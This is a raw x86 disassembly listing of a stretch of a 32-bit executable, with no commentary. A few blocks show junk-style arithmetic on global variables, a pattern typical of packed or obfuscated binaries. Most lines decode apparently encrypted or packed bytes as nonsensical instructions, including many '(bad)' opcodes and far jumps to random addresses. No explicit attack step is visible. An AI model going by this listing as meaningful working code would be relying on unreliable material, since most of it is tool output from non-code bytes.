  4035f7:	mov    edx,DWORD PTR ds:0x428279
  4035fd:	or     DWORD PTR ds:0x4282c9,edx
  403603:	mov    ecx,DWORD PTR [ebx]
  403605:	add    DWORD PTR ds:0x428201,0x4789
  40360f:	mov    edx,DWORD PTR [ebx+0x4]
  403612:	adc    DWORD PTR ds:0x428289,0x4282c5
  40361c:	jmp    0x4038c6
  403621:	cmp    al,0xa5
  403623:	in     eax,dx
  403624:	jmp    0xb57cdfa6
  403629:	mov    cl,0xfa
  40362b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40362c:	sti    
  40362d:	jecxz  0x4035f5
  40362f:	and    DWORD PTR [ecx],esi
  403631:	dec    edx
  403632:	jecxz  0x4035ef
  403634:	mov    ebx,0xbbbbbfd0
  403639:	mov    bl,0xba
  40363b:	cmp    edi,DWORD PTR [edx]
  40363d:	and    BYTE PTR [esi],ah
  40363f:	addr16 mov eax,ds:0x8234
  403643:	pop    edx
  403644:	jge    0x403694
  403646:	pop    esp
  403647:	jne    0x40362f
  403649:	fld    DWORD PTR [ebp-0x5d]
  40364c:	dec    ebp
  40364d:	push   esi
  40364e:	mov    BYTE PTR [esi-0x5721d03d],bl
  403654:	or     DWORD PTR [ebx+0x5],edi
  403657:	add    DWORD PTR [eax-0x3a],esi
  40365a:	ret    
  40365b:	popa   
  40365c:	sbb    al,0x2e
  40365e:	xchg   esi,edi
  403660:	stc    
  403661:	inc    esp
  403662:	test   eax,0x70d00d26
  403667:	push   ecx
  403668:	add    BYTE PTR gs:[ebp+0x383f98d9],bh
  40366f:	loopne 0x403626
  403671:	cmp    eax,0x6c3df4ad
  403676:	cmp    eax,DWORD PTR [edx+0x46]
  403679:	inc    ebx
  40367a:	int3   
  40367b:	cs imul edi,ebp,0x7
  40367f:	lods   eax,DWORD PTR ds:[esi]
  403680:	(bad)  
  403681:	ins    BYTE PTR es:[edi],dx
  403682:	jle    0x4036cf
  403684:	mov    eax,ds:0x5c474051
  403689:	stc    
  40368a:	stc    
  40368b:	xchg   edx,eax
  40368c:	call   0xe01c18d0
  403691:	mov    bl,0xc9
  403693:	jp     0x4036e4
  403695:	jmp    0x403635
  403697:	dec    ecx
  403698:	mov    ebp,0x614813fa
  40369d:	mov    WORD PTR [esi+0x22],cs
  4036a0:	mul    edx
  4036a2:	or     al,bh
  4036a4:	rcl    DWORD PTR [edx+edx*8+0x3e],cl
  4036a8:	mov    ch,ch
  4036aa:	and    DWORD PTR [esi+0x63],edx
  4036ad:	jmp    0xd405005b
  4036b2:	push   esi
  4036b3:	cmp    al,BYTE PTR [ebp-0x57]
  4036b6:	pop    eax
  4036b7:	mov    edx,0x39be0559
  4036bc:	mov    ebx,0xfd9d1131
  4036c1:	add    DWORD PTR [ebx-0x40],0xa9b9e2f8
  4036c8:	xchg   edi,eax
  4036c9:	push   ebp
  4036ca:	(bad)
  4036cd:	pop    ebx
  4036ce:	mov    WORD PTR [esi-0x67],cs
  4036d1:	xlat   BYTE PTR ds:[ebx]
  4036d2:	pop    edi
  4036d3:	pop    ecx
  4036d4:	cwde   
  4036d5:	loopne 0x40369f
  4036d7:	sbb    eax,0x5d9fcd0
  4036dc:	pop    edi
  4036dd:	xor    BYTE PTR [edx+ecx*1+0x1],0x3a
  4036e2:	test   al,0xf0
  4036e4:	retf   
  4036e5:	push   eax
  4036e6:	ret    
  4036e7:	call   0xe8d836d7
  4036ec:	lahf   
  4036ed:	dec    edx
  4036ee:	js     0x4036b7
  4036f0:	add    al,al
  4036f2:	(bad)  
  4036f3:	cli    
  4036f4:	mov    BYTE PTR [edi-0x3bdfa6a7],ch
  4036fa:	mov    ds,ebx
  4036fc:	test   BYTE PTR [eax-0x5b2b55e9],cl
  403702:	std    
  403703:	add    ah,BYTE PTR [ebx]
  403705:	imul   esp,DWORD PTR [esi],0x521eff08
  40370b:	arpl   WORD PTR [eax-0x61],di
  40370e:	add    esp,DWORD PTR [ebp-0x8]
  403711:	std    
  403712:	adc    eax,0xa42617a5
  403717:	adc    DWORD PTR [esi+ecx*4-0x60],0x40094747
  40371f:	mov    ebx,0xb00bab9d
  403724:	xor    ebx,edx
  403726:	or     DWORD PTR [eax],edi
  403728:	pop    edx
  403729:	mov    bh,0x13
  40372b:	xchg   edx,ebx
  40372d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40372e:	push   cs
  40372f:	push   ebx
  403730:	inc    ebx
  403731:	hlt    
  403732:	mov    ebp,0x4662de33
  403737:	rcr    ecx,0xb7
  40373a:	adc    BYTE PTR [esi+0x1b],cl
  40373d:	repz pusha 
  40373f:	test   al,0x34
  403741:	add    cl,bh
  403743:	mov    ds:0x88d2421b,al
  403748:	inc    ebx
  403749:	adc    edx,DWORD PTR [edx]
  40374b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40374c:	stos   DWORD PTR es:[edi],eax
  40374d:	xchg   ebx,eax
  40374e:	jp     0x40372a
  403750:	jl     0x4036fa
  403752:	mov    al,0xa7
  403754:	clc    
  403755:	sbb    al,0xbb
  403757:	mov    eax,0xdaa65f6f
  40375c:	adc    BYTE PTR [edi+0x32],cl
  40375f:	push   0xffffff90
  403761:	sar    edx,1
  403763:	test   BYTE PTR [ecx*1-0x56702f16],al
  40376a:	jle    0x40376d
  40376c:	call   0x8e276e6d
  403771:	test   al,0x77
  403773:	push   cs
  403774:	mov    eax,ds:0x2318207f
  403779:	arpl   WORD PTR [eax-0xb],bp
  40377c:	scas   eax,DWORD PTR es:[edi]
  40377d:	popa   
  40377e:	repnz push esp
  403780:	nop
  403781:	or     edx,DWORD PTR [edx]
  403783:	jns    0x403753
  403785:	dec    edi
  403786:	test   dl,bl
  403788:	mov    ebx,DWORD PTR [edx+ecx*1]
  40378b:	dec    esp
  40378c:	bound  ecx,QWORD PTR [ecx-0x34be8ee5]
  403792:	xchg   edx,eax
  403793:	inc    ecx
  403794:	adc    BYTE PTR [eax],0xa8
  403797:	in     eax,0xc2
  403799:	btc    DWORD PTR [ebx*4+0x3b534c06],edx
  4037a1:	add    ebx,DWORD PTR [eax]
  4037a3:	mov    ds:0x50e3eb80,eax
  4037a8:	inc    ebp
  4037a9:	fisttp QWORD PTR [edi-0x30]
  4037ac:	imul   eax,ebp,0x735d6481
  4037b2:	fnstcw WORD PTR [ebx+0x6e]
  4037b5:	add    DWORD PTR [ebx],esp
  4037b7:	add    ah,bh
  4037b9:	loop   0x4037f5
  4037bb:	inc    eax
  4037bc:	loopne 0x4037f9
  4037be:	in     eax,dx
  4037bf:	test   edi,0xf4ae0795
  4037c5:	xor    DWORD PTR [ebx+0x1a4bcb59],0x22
  4037cc:	xor    eax,ebp
  4037ce:	dec    esp
  4037cf:	(bad)  
  4037d0:	rol    DWORD PTR [ebx+0x78c39620],1
  4037d6:	rcl    BYTE PTR [esi+0x36],1
  4037d9:	pop    ss
  4037da:	mov    ch,0x2a
  4037dc:	jge    0x4037b3
  4037de:	iret   
  4037df:	into   
  4037e0:	push   cs
  4037e1:	add    cl,BYTE PTR [edx+esi*8-0x298f3a66]
  4037e8:	push   ds
  4037e9:	(bad)  
  4037ea:	mov    edi,0x5f106628
  4037ef:	push   edx
  4037f0:	inc    eax
  4037f1:	jb     0x403784
  4037f3:	jge    0x4037b5
  4037f5:	(bad)  
  4037f6:	and    al,0xf1
  4037f8:	jno    0x4037c5
  4037fa:	rol    DWORD PTR [ebx-0x71],1
  4037fd:	mov    ds:0xe0e6d6d5,eax
  403802:	dec    esp
  403803:	mov    dh,0xd9
  403805:	imul   BYTE PTR [edx+0x57]
  403808:	xchg   esi,ebp
  40380a:	pop    ecx
  40380b:	dec    esi
  40380c:	ss sahf 
  40380e:	push   ecx
  40380f:	mov    esp,ds
  403811:	mov    edx,0x87303166
  403816:	es (bad) 
  403819:	xor    esp,esp
  40381b:	enter  0xf32a,0xc9
  40381f:	sub    BYTE PTR [ebx-0x49fafb19],ah
  403825:	call   0xe62e:0xc14c02ef
  40382c:	aas    
  40382d:	imul   ebp,DWORD PTR [edi],0x40
  403830:	ja     0x403812
  403832:	jg     0x403892
  403834:	xchg   BYTE PTR [ebp-0x74],bl
  403837:	div    al
  403839:	mov    ds:0x332684bd,al
  40383e:	sahf   
  40383f:	cmc    
  403840:	mov    bl,0x38
  403842:	sbb    ch,BYTE PTR [ecx]
  403844:	out    dx,al
  403845:	cmp    BYTE PTR [edx-0x3],ch
  403848:	sub    al,ah
  40384a:	aaa    
  40384b:	xchg   ebp,eax
  40384c:	xchg   DWORD PTR [eax-0x27],edi
  40384f:	jmp    0xbe68719c
  403854:	and    dl,BYTE PTR ds:0xbbe7c584
  40385a:	jne    0x4038a8
  40385c:	scas   eax,DWORD PTR es:[edi]
  40385d:	or     al,0x2b
  40385f:	add    dh,bh
  403861:	not    BYTE PTR [eax+0x4e]
  403864:	adc    DWORD PTR [esi],esi
  403866:	outs   dx,BYTE PTR ds:[esi]
  403867:	ss jmp 0xf872:0x901722b0
  40386f:	dec    esi
  403870:	xchg   esi,eax
  403871:	or     edx,edi
  403873:	aam    0x46
  403875:	std    
  403876:	jle    0x403847
  403878:	fstp   DWORD PTR [ecx+0x6d]
  40387b:	(bad)  
  40387c:	mov    ebp,0xc56697f8
  403881:	jnp    0x40389b
  403883:	fwait
  403884:	xor    al,0xfc
  403886:	pop    ecx
  403887:	xchg   esi,eax
  403888:	mov    edx,0xb7f38981
  40388d:	imul   eax,DWORD PTR [ecx+0x70],0x66
  403891:	arpl   WORD PTR [esi-0x33c616b4],cx
  403897:	es enter 0xa4ff,0x8b
  40389c:	in     eax,0x22
  40389e:	inc    esi
  40389f:	and    BYTE PTR [eax],al
  4038a1:	retf   0xdce5
  4038a4:	outs   dx,DWORD PTR ds:[esi]
  4038a5:	xor    BYTE PTR [esi-0x5152032b],dl
  4038ab:	push   0x30c70026
  4038b0:	in     eax,dx
  4038b1:	loop   0x4038a2
  4038b3:	fwait
  4038b4:	inc    edi
  4038b5:	mov    dl,0xd2
  4038b7:	inc    eax
  4038b8:	mov    dh,0x7e
  4038ba:	aas    
  4038bb:	add    al,0x37
  4038bd:	jmp    ebp
  4038bf:	out    0x65,al
  4038c1:	push   edi
  4038c2:	lods   eax,DWORD PTR ds:[esi]
  4038c3:	mov    ebp,es
  4038c5:	mov    edi,0x33e47d31
  4038ca:	rol    BYTE PTR [ecx+0x4282250d],cl
  4038d0:	add    BYTE PTR [ecx-0x7e],al
  4038d3:	inc    edx
  4038d4:	add    BYTE PTR [ebx],cl
  4038d6:	push   ebp
  4038d7:	in     al,0x81
  4038d9:	add    eax,0x428219
  4038de:	arpl   WORD PTR [edx+0x0],bp
  4038e1:	add    cl,al
  4038e3:	loope  0x403903
  4038e5:	imul   edx,DWORD PTR [ebp-0x2c]
  4038e9:	add    DWORD PTR ds:0x428235,0x2ce6
  4038f3:	sub    DWORD PTR [eax],edx
  4038f5:	mov    DWORD PTR ds:0x428275,0x2c97
  4038ff:	jmp    0x403f70
  403904:	shrd   ecx,edx,0x2
  403908:	mov    DWORD PTR [ebp-0x1c],ecx
  40390b:	mov    ecx,DWORD PTR [ebp+0x18]
  40390e:	add    DWORD PTR ds:0x4282cd,0x6992
  403918:	xor    DWORD PTR [ebp-0x1c],edi
  40391b:	shl    ecx,0x1e
  40391e:	xor    ecx,ecx
  403920:	sbb    DWORD PTR ds:0x4281ad,0x4281b1
  40392a:	or     ecx,DWORD PTR [ebp-0x1c]
  40392d:	shr    edx,0x2
  403930:	cmp    DWORD PTR ds:0x428219,0x0
  403937:	mov    edx,0x1946
  40393c:	mov    DWORD PTR ds:0x4281b1,0x32b9
  403946:	mov    DWORD PTR ds:0x428229,0x494d
  403950:	jmp    0x4039a1
  403955:	mov    DWORD PTR ds:0x4282b1,0x7388
  40395f:	cmp    DWORD PTR ds:0x428219,0x0
  403966:	je     0x40398f
  40396c:	push   DWORD PTR [ebp-0x18]
  40396f:	push   0x63d6
  403974:	call   DWORD PTR ds:0x428ab0
  40397a:	movzx  edx,WORD PTR ds:0x42821d
  403981:	add    DWORD PTR ds:0x4281a1,edx
  403987:	xor    DWORD PTR ds:0x4281ad,edx
  40398d:	neg    edx
  40398f:	xor    DWORD PTR ds:0x428235,edi
  403995:	sbb    edx,0x2baa
  40399b:	or     edx,DWORD PTR ds:0x428205
  4039a1:	mov    edx,DWORD PTR [ebp+0x1c]
  4039a4:	jmp    0x403c4e
  4039a9:	push   cs
  4039aa:	cdq    
  4039ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ac:	icebp  
  4039ad:	lods   eax,DWORD PTR ds:[esi]
  4039ae:	cmc    
  4039af:	popf   
  4039b0:	mov    ebp,0x712f5730
  4039b5:	add    BYTE PTR [ecx+eiz*2-0x44189ecf],ch
  4039bc:	mov    ebx,0xbbbbbfd0
  4039c1:	or     al,BYTE PTR [edx+0x44]
  4039c4:	inc    eax
  4039c5:	cwde   
  4039c6:	or     ah,dl
  4039c8:	scas   al,BYTE PTR es:[edi]
  4039c9:	lock xchg ebp,eax
  4039cb:	xor    BYTE PTR [esi-0x6e9cee11],dl
  4039d1:	retf   
  4039d2:	dec    ecx
  4039d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039d4:	jmp    0x403a30
  4039d6:	shr    ecx,1
  4039d8:	jecxz  0x4039dc
  4039da:	mov    esp,0x3b8e0b86
  4039df:	test   ebx,esi
  4039e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039e2:	aam    0x73
  4039e4:	imul   ecx,DWORD PTR [edx-0x6],0x1d
  4039e8:	xor    BYTE PTR [esi-0x379de804],0x33
  4039ef:	mov    ecx,0xb16ee46f
  4039f4:	test   eax,0xb4d9d64c
  4039f9:	push   ebx
  4039fa:	and    ecx,DWORD PTR [edi+0x3]
  4039fd:	mov    bh,0xbd
  4039ff:	cdq    
  403a00:	mov    ecx,0x9577c719
  403a05:	sbb    BYTE PTR [ebp-0x7f32dba4],cl
  403a0b:	cmp    eax,0x8c048219
  403a10:	gs xchg ebp,eax
  403a12:	pop    ebp
  403a13:	mov    ebx,0x64d25cbe
  403a18:	or     edi,eax
  403a1a:	adc    eax,0x2c38517b
  403a1f:	fisubr WORD PTR [ebp-0x37]
  403a22:	push   edi
  403a23:	jae    0x4039d3
  403a25:	and    dh,BYTE PTR [eax-0x5b]
  403a28:	mov    ds:0xe86a0eb4,eax
  403a2d:	je     0x403a76
  403a2f:	sbb    al,0x98
  403a31:	ds jne 0x403a81
  403a34:	mov    ch,0x13
  403a36:	idiv   BYTE PTR [ecx-0x4e]
  403a39:	mov    dh,0xf7
  403a3b:	enter  0x7770,0x53
  403a3f:	pop    ecx
  403a40:	xor    dl,BYTE PTR ss:[ebx+0x5543debd]
  403a47:	add    al,ch
  403a49:	rol    DWORD PTR [edx+0x29],1
  403a4c:	inc    ecx
  403a4d:	adc    DWORD PTR [ebp+0x3e],edi
  403a50:	jo     0x4039dd
  403a52:	push   esp
  403a53:	aaa    
  403a54:	retf   0x9b71
  403a57:	push   ebx
  403a58:	imul   edx,DWORD PTR [ebp-0x73ebae9e],0xffffffce
  403a5f:	mov    ds:0xe2a3eaec,eax
  403a64:	cli    
  403a65:	push   ds
  403a66:	mov    BYTE PTR [ebx],ah
  403a68:	inc    edi
  403a69:	jae    0xce615e15
  403a6f:	sar    BYTE PTR [eax+0x60024ded],cl
  403a75:	dec    edi
  403a76:	iret   
  403a77:	ins    DWORD PTR es:[edi],dx
  403a78:	inc    ebx
  403a79:	inc    ebp
  403a7a:	add    DWORD PTR [ebp+ebp*4+0x31],esi
  403a7e:	jl     0x403a2c
  403a80:	jl     0x403a4a
  403a82:	cmp    bl,BYTE PTR [esi+0x26]
  403a85:	cmc    
  403a86:	stos   DWORD PTR es:[edi],eax
  403a87:	jl     0x403b01
  403a89:	adc    BYTE PTR [edi],al
  403a8b:	dec    ebp
  403a8c:	iret   
  403a8d:	fidivr WORD PTR [esi+esi*1]
  403a90:	mov    eax,0x8ceddd6
  403a95:	shl    ebp,0xce
  403a98:	sbb    esi,esi
  403a9a:	adc    BYTE PTR [edx],bl
  403a9c:	call   0x76fd:0xc8b359e7
  403aa3:	repnz in eax,dx
  403aa5:	push   ecx
  403aa6:	aaa    
  403aa7:	cmc    
  403aa8:	stc    
  403aa9:	icebp  
  403aaa:	inc    ebx
  403aab:	dec    ebx
  403aac:	(bad)  
  403aae:	bound  ecx,QWORD PTR [esi]
  403ab0:	aam    0xcd
  403ab2:	stos   BYTE PTR es:[edi],al
  403ab3:	test   DWORD PTR [edx],0xde5151ee
  403ab9:	loopne 0x403aa1
  403abb:	mov    edi,0xaf078491
  403ac0:	xchg   ebp,eax
  403ac1:	sub    eax,0x341d4535
  403ac6:	pop    ebp
  403ac7:	dec    esi
  403ac8:	push   ss
  403ac9:	jmp    0x1bf2035a
  403ace:	shl    DWORD PTR ds:0x3800e31b,cl
  403ad4:	(bad)  
  403ad5:	push   ds
  403ad6:	dec    ebp
  403ad7:	test   BYTE PTR [ecx],ah
  403ad9:	int3   
  403ada:	or     edx,DWORD PTR [ebp+0x5e55a5ed]
  403ae0:	and    eax,0x348b5b74
  403ae5:	dec    eax
  403ae6:	and    BYTE PTR [ebx-0x478c134a],bl
  403aec:	jmp    0xa984:0x57918ea3
  403af3:	mov    ch,0x3
  403af5:	repz xor ah,BYTE PTR [ecx]
  403af8:	lods   eax,DWORD PTR ds:[esi]
  403af9:	pop    ds
  403afa:	lea    ebp,[ebp+0x2b148039]
  403b00:	xchg   BYTE PTR [ebp-0x67596fb9],dh
  403b06:	and    ebx,ebx
  403b08:	aam    0x27
  403b0a:	lock xor eax,0x5b139981
  403b10:	jb     0x403b44
  403b12:	mov    cr6,ebx
  403b15:	push   esp
  403b16:	and    eax,0xfa2a7692
  403b1b:	jg     0x403b3f
  403b1d:	adc    al,0xd5
  403b1f:	inc    esi
  403b20:	jecxz  0x403b11
  403b22:	add    BYTE PTR [esi+0x217b4b3d],dh
  403b28:	mov    al,0xbe
  403b2a:	xor    al,0x2d
  403b2c:	loopne 0x403b1d
  403b2e:	adc    DWORD PTR [edx-0x23f177e0],ebx
  403b34:	or     al,0x5
  403b36:	repnz loop 0x403b8c
  403b39:	jmp    0xe8f19d82
  403b3e:	jl     0x403bb5
  403b40:	sub    ebp,edx
  403b42:	pop    esi
  403b43:	mov    bl,0xa7
  403b45:	adc    edi,edi
  403b47:	inc    esp
  403b48:	cli    
  403b49:	jno    0x403b62
  403b4b:	push   ds
  403b4c:	js     0x403b54
  403b4e:	pop    ecx
  403b4f:	jno    0x403ba7
  403b51:	stc    
  403b52:	popf   
  403b53:	dec    esp
  403b54:	or     edi,DWORD PTR [ebp+ebp*8-0x3b428434]
  403b5b:	dec    ebx
  403b5c:	stos   DWORD PTR es:[edi],eax
  403b5d:	fdivr  st,st(4)
  403b5f:	stos   BYTE PTR es:[edi],al
  403b60:	add    DWORD PTR [ecx+0x30],eax
  403b63:	inc    ecx
  403b64:	pop    ebx
  403b65:	in     al,0x23
  403b67:	push   ds
  403b68:	sub    al,BYTE PTR [ebx]
  403b6a:	shr    BYTE PTR [edi*2+0x607bc052],1
  403b71:	pop    ecx
  403b72:	iret   
  403b73:	jle    0x403b56
  403b75:	bound  ecx,QWORD PTR [ebp-0x34]
  403b78:	push   cs
  403b79:	pop    es
  403b7a:	dec    edi
  403b7b:	adc    ebp,eax
  403b7d:	shr    DWORD PTR [edx],1
  403b7f:	hlt    
  403b80:	test   al,0x62
  403b82:	out    dx,eax
  403b83:	and    bl,bh
  403b85:	push   esp
  403b86:	adc    ah,ch
  403b88:	or     al,0x99
  403b8a:	cli    
  403b8b:	push   0x70
  403b8d:	mov    eax,ds:0xc8f54637
  403b92:	out    dx,al
  403b93:	mov    al,ds:0xf3b43701
  403b98:	mov    edx,0x63c40c64
  403b9d:	mov    esp,0xffc2ab73
  403ba2:	add    al,0xf2
  403ba4:	bound  esi,QWORD PTR ds:[ebx]
  403ba7:	out    dx,al
  403ba8:	mov    BYTE PTR [esi+ebp*4-0xa089e56],ah
  403baf:	adc    edi,eax
  403bb1:	repz cmp esi,esi
  403bb4:	mov    al,0x2c
  403bb6:	nop
  403bb7:	js     0x403bc8
  403bb9:	jo     0x403c39
  403bbb:	adc    al,0x69
  403bbd:	fld    QWORD PTR [edx-0xdbf1c0]
  403bc3:	popf   
  403bc4:	push   ebx
  403bc5:	push   es
  403bc6:	ins    DWORD PTR es:[edi],dx
  403bc7:	cdq    
  403bc8:	clc    
  403bc9:	mov    ds:0x195a3e20,al
  403bce:	sub    DWORD PTR [edx],eax
  403bd0:	sub    al,0xca
  403bd2:	js     0x403ba5
  403bd4:	(bad)  
  403bd6:	rcl    BYTE PTR [ebx+0x5109ecb7],0x52
  403bdd:	iret   
  403bde:	push   esi
  403bdf:	jle    0x403b77
  403be1:	push   ebx
  403be2:	sub    eax,0x4bcfa0fe
  403be7:	mov    esi,0xee1aa6df
  403bec:	dec    ebp
  403bed:	and    DWORD PTR [ebx+0x58f94ae7],ebp
  403bf3:	xchg   edx,eax
  403bf4:	mov    fs,WORD PTR [edx-0x5c]
  403bf7:	jl     0x403c74
  403bf9:	mov    cl,0xe4
  403bfb:	scas   al,BYTE PTR es:[edi]
  403bfc:	jmp    0x706:0x166d85d6
  403c03:	xchg   ebx,eax
  403c04:	bound  ecx,QWORD PTR [edi]
  403c06:	call   0x240e:0x43108754
  403c0d:	adc    eax,0x1eb6d4cc
  403c12:	adc    DWORD PTR [ebx-0x68],eax
  403c15:	inc    ecx
  403c16:	pop    esp
  403c17:	ret    
  403c18:	lds    edi,FWORD PTR [ebp+0x21adfa1e]
  403c1e:	xchg   ebp,eax
  403c1f:	add    eax,0xc7749c43
  403c24:	es inc eax
  403c26:	div    DWORD PTR [edx-0x2a]
  403c29:	cli    
  403c2a:	scas   al,BYTE PTR es:[edi]
  403c2b:	cli    
  403c2c:	dec    edi
  403c2d:	icebp  
  403c2e:	retf   0xc606
  403c31:	mov    esp,DWORD PTR [esi]
  403c33:	aas    
  403c34:	xchg   ebx,eax
  403c35:	ja     0x403ca8
  403c37:	leave  
  403c38:	das    
  403c39:	sbb    eax,0x26a18eda
  403c3e:	scas   eax,DWORD PTR es:[edi]
  403c3f:	mov    bl,0xd7
  403c41:	push   ds
  403c42:	xor    al,0xdc
  403c44:	jne    0x403bde
  403c46:	push   es
  403c47:	push   ebp
  403c48:	xor    edi,ebx
  403c4a:	sbb    eax,0x899aa779
  403c4f:	dec    ebp
  403c50:	aam    0x8b
  403c52:	push   cs
  403c53:	add    edx,DWORD PTR ds:0x4282b1
  403c59:	mov    edx,DWORD PTR [esi+0x4]
  403c5c:	shrd   ecx,edx,0x2
  403c60:	add    DWORD PTR ds:0x428199,0x7908
  403c6a:	shr    edx,0x2
  403c6d:	or     DWORD PTR ds:0x4281ad,edx
  403c73:	mov    DWORD PTR [ebp-0x1c],ecx
  403c76:	and    DWORD PTR ds:0x428239,0xbe4
  403c80:	mov    ecx,DWORD PTR [esi]
  403c82:	mov    edx,DWORD PTR [esi+0x4]
  403c85:	add    DWORD PTR ds:0x42827d,0x77cc
  403c8f:	xor    DWORD PTR [ebp-0x1c],edi
  403c92:	add    DWORD PTR ds:0x4282b1,0x70c
  403c9c:	jmp    0x403f46
  403ca1:	pop    eax
  403ca2:	dec    ebx
  403ca3:	dec    edi
  403ca4:	jo     0x403d03
  403ca6:	je     0x403d25
  403ca8:	jae    0x403d01
  403caa:	test   DWORD PTR [edi],0xd0c6fd05
  403cb0:	sti    
  403cb1:	outs   dx,BYTE PTR ds:[esi]
  403cb2:	lock mov ebx,0xbbbfd0bb
  403cb8:	mov    ebx,0x2fabe5b
  403cbd:	mov    cs,edi
  403cbf:	inc    ebp
  403cc0:	xor    dh,BYTE PTR [esi+0x18]
  403cc3:	mov    ebx,0xe7bcfd0a
  403cc8:	sub    eax,0x87b5283f
  403ccd:	mov    ebx,0xb0db439a
  403cd3:	sub    al,0x1b
  403cd5:	adc    al,0xdd
  403cd7:	cmc    
  403cd8:	push   esi
  403cd9:	push   ecx
  403cda:	jae    0x403d0c
  403cdc:	div    cl
  403cde:	mov    BYTE PTR [ebp-0x9921124],dh
  403ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce5:	xchg   ecx,eax
  403ce6:	push   ss
  403ce7:	and    ecx,ecx
  403ce9:	mov    esi,0x4bbdb0c4
  403cee:	loop   0x403d65
  403cf0:	push   ds
  403cf1:	xor    eax,0xe991063
  403cf6:	sbb    BYTE PTR [edx-0x6e9278e3],al
  403cfc:	xchg   edx,eax
  403cfd:	out    0x1f,al
  403cff:	push   ecx
  403d00:	(bad)  
  403d01:	sub    edx,DWORD PTR [eax-0x5cf18e5e]
  403d07:	sbb    BYTE PTR [edx],bh
  403d09:	jmp    0x403d4c
  403d0b:	pop    ecx
  403d0c:	rcr    DWORD PTR [edi+0x1c],1
  403d0f:	fdiv   QWORD PTR [edi+0x245e4ef0]
  403d15:	inc    esp
  403d16:	push   ebx
  403d17:	stc    
  403d18:	lea    ebx,[esi-0x1]
  403d1b:	js     0x403cf2
  403d1d:	xchg   ebx,eax
  403d1f:	ds mov eax,0x2956022e
  403d25:	pop    esi
  403d26:	mov    al,ds:0x812a4b76
  403d2b:	fidiv  DWORD PTR [eax-0x2cc25c40]
  403d31:	retf   
  403d32:	loopne 0x403d87
  403d34:	mov    al,ds:0x57323d72
  403d39:	xchg   ecx,eax
  403d3a:	(bad)  
  403d3b:	dec    esi
  403d3c:	xchg   edx,eax
  403d3d:	int3   
  403d3e:	push   esi
  403d3f:	mov    ah,0x69
  403d41:	mov    edi,0xf26a066f
  403d46:	and    ecx,DWORD PTR [esi-0x6f]
  403d49:	add    BYTE PTR [edi],dh
  403d4b:	(bad)  
  403d4c:	loopne 0x403d1f
  403d4e:	jb     0x403d1d
  403d50:	cmp    eax,0x8311792
  403d55:	mov    cl,0x1f
  403d57:	loope  0x403dcd
  403d59:	xchg   ebx,eax
  403d5a:	rcl    BYTE PTR [edx],1
  403d5c:	cs push ss
  403d5e:	mov    ah,0xbe
  403d60:	sub    DWORD PTR [eax],esp
  403d62:	inc    edx
  403d63:	(bad)  
  403d64:	fisub  WORD PTR [ebx]
  403d66:	into   
  403d67:	(bad)  
  403d69:	adc    eax,0x309a1bc8
  403d6e:	or     al,0x72
  403d70:	(bad)  
  403d71:	cmp    eax,DWORD PTR [eax+0x5babeb4d]
  403d77:	pop    edi
  403d78:	adc    DWORD PTR [edx+0x58],esi
  403d7b:	cmp    al,0x2b
  403d7d:	shl    BYTE PTR [edi+edi*8-0x15],1
  403d81:	or     DWORD PTR ss:[ebp-0x3286ff3a],eax
  403d88:	or     bl,BYTE PTR [ebp-0x4bf64d01]
  403d8e:	jecxz  0x403e09
  403d90:	sub    al,dh
  403d92:	adc    ecx,DWORD PTR [esi+edi*4-0x73]
  403d96:	jno    0x403dec
  403d98:	xchg   ebp,eax
  403d99:	cmp    ebp,DWORD PTR [esi]
  403d9b:	mov    dh,0xf
  403d9d:	mov    al,0x9f
  403d9f:	cmp    al,0xa2
  403da1:	jae    0x403d8f
  403da3:	cmp    ebx,DWORD PTR [eax]
  403da5:	jo     0x403db7
  403da7:	sbb    DWORD PTR [edx-0x41],0xffffffda
  403dab:	sub    bl,dl
  403dad:	(bad)  
  403dae:	imul   esi,ecx,0x1d
  403db1:	aas    
  403db2:	(bad)  
  403db3:	retf   0x24ff
  403db6:	cmp    al,0x11
  403db8:	adc    ebp,esp
  403dba:	sbb    BYTE PTR [ebx+esi*1-0x10],cl
  403dbe:	rcr    BYTE PTR [esi-0x6c3a4f1c],1
  403dc4:	mov    ebx,0x73f68c3a
  403dc9:	sar    DWORD PTR [ebx],1
  403dcb:	aad    0x26
  403dcd:	push   ss
  403dce:	sbb    al,0x48
  403dd0:	add    al,0x81
  403dd2:	pop    ebp
  403dd3:	or     bl,bl
  403dd5:	push   edx
  403dd6:	pop    ebx
  403dd7:	stc    
  403dd8:	mov    dl,0x69
  403dda:	je     0x403d5f
  403ddc:	mov    ebx,0x161b3827
  403de1:	mov    gs,edx
  403de3:	sub    edi,DWORD PTR [ecx*8+0x2bcda95b]
  403dea:	adc    ebx,DWORD PTR [esi-0x7e]
  403ded:	jmp    0x403dab
  403def:	fcom   DWORD PTR [ebp-0x6d]
  403df2:	add    ebx,esi
  403df4:	into   
  403df5:	push   cs
  403df6:	xchg   edi,eax
  403df7:	xor    al,0x9a
  403df9:	mov    bl,0xb9
  403dfb:	into   
  403dfc:	xchg   BYTE PTR [ebx+0x7],bh
  403dff:	jp     0x403dc1
  403e01:	clc    
  403e02:	and    BYTE PTR [ecx-0x1e],bh
  403e05:	cmp    eax,0x199509bf
  403e0a:	jecxz  0x403de5
  403e0c:	cmp    al,0xf
  403e0e:	das    
  403e0f:	(bad)  [eax+0x5ffd5374]
  403e15:	retf   0xf45
  403e18:	sbb    DWORD PTR [ebx],ebx
  403e1a:	mov    cs,ebx
  403e1c:	mov    bl,0xbc
  403e1e:	pop    ss
  403e1f:	sub    al,BYTE PTR [ebx-0x638c2c01]
  403e25:	and    al,0xdc
  403e27:	jno    0x403e52
  403e29:	mov    DWORD PTR [ebx],esp
  403e2b:	jns    0x403e40
  403e2d:	and    BYTE PTR [ebx+0x46],dl
  403e30:	stc    
  403e31:	xchg   edi,eax
  403e32:	jg     0x403e66
  403e34:	xchg   edx,eax
  403e35:	inc    ecx
  403e36:	icebp  
  403e37:	(bad)  
  403e38:	fisubr WORD PTR [esi-0x2a356fb5]
  403e3e:	jge    0x403e84
  403e40:	call   0x5029fe0f
  403e45:	stos   BYTE PTR es:[edi],al
  403e46:	mov    al,ds:0x4971ba31
